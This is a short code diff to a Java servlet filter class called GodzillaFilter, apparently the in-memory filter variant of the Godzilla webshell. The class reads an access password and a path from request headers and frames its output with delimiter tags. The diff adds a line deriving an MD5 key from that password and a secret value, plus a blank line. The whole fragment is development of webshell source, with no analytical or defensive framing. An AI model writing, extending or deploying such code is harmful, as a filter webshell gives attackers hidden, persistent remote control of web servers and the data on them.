@@ -117,6 +117,7 @@ public class GodzillaFilter extends ClassLoader implements Filter {
     public boolean equals(Object obj) {
         this.parseObj(obj);
         this.Pwd = this.request.getHeader("p");
+        this.md5 = md5(this.Pwd + this.xc);
         this.path = this.request.getHeader("path");
         StringBuffer output = new StringBuffer();
         String tag_s = "->|";
@@ -243,6 +244,7 @@ public class GodzillaFilter extends ClassLoader implements Filter {
     }
 
     public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
+
         try {
             HttpServletRequest request = (HttpServletRequest)req;
             HttpServletResponse response = (HttpServletResponse)resp;
